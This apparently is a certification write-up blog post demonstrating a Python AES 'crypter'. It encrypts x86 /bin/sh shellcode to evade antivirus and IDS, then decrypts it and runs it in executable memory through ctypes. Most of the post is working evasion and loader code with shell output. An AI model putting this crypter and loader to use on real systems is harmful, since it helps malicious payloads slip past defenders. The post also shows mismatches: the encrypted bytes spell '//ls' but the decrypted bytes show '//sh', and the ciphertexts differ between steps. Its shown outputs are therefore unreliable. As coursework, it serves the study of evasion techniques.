---
title:  "SLAE x86 Assignment 7: Custom Crypter"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

### Custom Crypter
------

* Create a custom Crypter
* Use any encryption schema
* Use any programming language

#### Concept 
-----

A Crypter is defined as a tool that has the ability to encrypt, obfuscate, and manipulate malicious code making it undetectable to common AV and IDS systems. 

Similar to the custom Encoder created in an earlier assignment, the concept is expanded on with the use of an encryption scheme, leading to a higher success rate of evasion by decrypting the malicious code at run-time and executing on the target host.

The AES (Advanced Encryption Standard) cipher algorithm also known as Rijndael, will be used to illustrate the concept of a custom Crypter:

* Symmetric-key algorithm (same key used to encrypt and decrypt the data)
* 3 different key sizes - 128/192/256 bits
* 128-bit block sizes (data is divided into 4x4 arrays, each containing 16 bytes)
* High-speed performance and low RAM (memory) utilization when encrypting/decrypting 

![AES](/assets/images/AES.jpg) 

3 phases used to demonstrate the Crypter process:

* Encryption
* Decryption (with execution of the shellcode)
* POC (complete Crypter process)

#### Encryption
--------

The execve-stack shellcode from the course material will be used as a reference for the shellcode, which spawns a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host:

```bash
"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

A python script will be used as a Crypter wrapper to implement the AES encryption/decryption, referenced from Code Koala [http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto] [encryption-codekoala].

Note in this instance a static 128-bit key <code class="language-plaintext highlighter-rouge">KeepMeSecureEKEY</code> is hardcoded into the script for the sake of the POC to illustrate the concept, best practice recommends a randomly generated key dynamically generated (avoid hardcoding/storing within the script):

```python
#!/usr/bin/python

# Filename: AES_encryption.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate encrypted shellcode from the original shellcode
# Usage: python AES_encryption.py 

from Crypto.Cipher import AES
import sys
import os
import base64

def aes128(shc):

#block size = 16 byte arrays
 BLOCK_SIZE = 16 
 PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

#static encryption/decryption key - must be 16/24/32 bytes long
 secret = 'KeepMeSecureEKEY' 
 cipher = AES.new(secret)
 encoded = EncodeAES(cipher, shc)
 print 'Encrypted shellcode (AES 128-bit key + base-64 encoded):\n\n', encoded

#execve-stack shellcode to spawn /bin/sh shell
shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

EKEY = aes128 (shellcode)
```

As a POC, the AES encryption wrapper script is executed resulting in the original shellcode being encrypted and base-64 encoded:

```bash
osboxes@osboxes:~/Downloads/SLAE$ python AES_encryption.py 
Encrypted shellcode (AES 128-bit key + base-64 encoded):

5CJtU2PsI+erEYEb0l/3xle2srUXUxlJ8Zcv0RUKDAzn8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg==
```

#### Decryption (Along with execution of the shellcode)
--------------

For the decryption portion, the encrypted shellcode is hardcoded within the python wrapper script along with the AES key:

```python
#!/usr/bin/python

# Filename: AES_decryption.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to decrypt encrypted shellcode and execute original shellcode
# Usage: python AES_decryption.py 

from Crypto.Cipher import AES
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import base64
import os

#block size = 16 byte arrays
BLOCK_SIZE = 16
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#static encryption/decryption key - must be 16/24/32 bytes long
secret = 'KeepMeSecureEKEY' 
cipher = AES.new(secret)

#encrypted shellcode from AES_encryption.py
encoded = '5CJtU2PsI+erEYEb0l/3xiQvT0P0eeArByo4NEbKDb3n8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg=='
decoded = DecodeAES(cipher, encoded)
print 'Decrypted shellcode (AES 128-bit key + base-64 decoded):\n\n', decoded

#execute execve-stack shellcode to spawn /bin/sh shell
libc = CDLL('libc.so.6')
shellcode = decoded.replace('\\x', '').decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
print '\nShellcode length: %d bytes\n' % len(shellcode)
print 'Here comes your shell ...'
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
```

As a POC, the encrypted shellcode hardcoded within the python wrapper script is decoded with the AES key, along with a base-64 decode to extract the original <code class="language-plaintext highlighter-rouge">/bin/sh</code> shellcode and executed at run-time spawing a shell on the local host:

```bash
osboxes@osboxes:~/Downloads/SLAE$ python AES_decryption.py 
Decrypted shellcode (AES 128-bit key + base-64 decoded):

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Shellcode length: 25 bytes

Here comes your shell ...
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ 
```

#### POC (Complete Crypter process)
--------------

The complete Crypter process has been encapsulated within this python wrapper script:

```python
# Filename: AES_crypter.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate encrypted shellcode from the original shellcode, decrypt encrypted shellcode and execute original shellcode
# Usage: python AES_crypter.py 

from Crypto.Cipher import AES
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys
import os
import base64

def aes128(shc):

#encryption

#block size = 16 byte arrays 
 BLOCK_SIZE = 16 
 PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

#static encryption/decryption key - must be 16/24/32 bytes long
 secret = 'KeepMeSecureEKEY' 
 cipher = AES.new(secret)
 encoded = EncodeAES(cipher, shc)
 print 'Encrypted shellcode (AES 128-bit key + base-64 encoded):\n\n', encoded

#execve-stack shellcode to spawn /bin/sh shell
shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

EKEY = aes128 (shellcode)

#decryption

#block size = 16 byte arrays
BLOCK_SIZE = 16
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#static encryption/decryption key - must be 16/24/32 bytes long
secret = 'KeepMeSecureEKEY'
cipher = AES.new(secret)

#encrypted shellcode - execve-stack shellcode to spawn /bin/sh shell
encoded = '5CJtU2PsI+erEYEb0l/3xiQvT0P0eeArByo4NEbKDb3n8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg=='
decoded = DecodeAES(cipher, encoded)
print '\nDecrypted shellcode (AES 128-bit key + base-64 decoded):\n\n', decoded

#execute execve-stack shellcode to spawn /bin/sh shell
libc = CDLL('libc.so.6')
shellcode = decoded.replace('\\x', '').decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
print '\nShellcode length: %d bytes\n' % len(shellcode)
print 'Here comes your shell ...'
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
```

The final POC, the complete custom Crypter generates encrypted shellcode from the original shellcode, decrypts the encrypted shellcode at run-time, and executes the original <code class="language-plaintext highlighter-rouge">/bin/sh</code> shellcode spawing a shell on the local host:

```bash
osboxes@osboxes:~/Downloads/SLAE$ python AES_crypter.python 
Encrypted shellcode (AES 128-bit key + base-64 encoded):

5CJtU2PsI+erEYEb0l/3xle2srUXUxlJ8Zcv0RUKDAzn8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg==

Decrypted shellcode (AES 128-bit key + base-64 decoded):

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Shellcode length: 25 bytes

Here comes your shell ...
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ 
```

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment7
[encryption-codekoala]: http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto
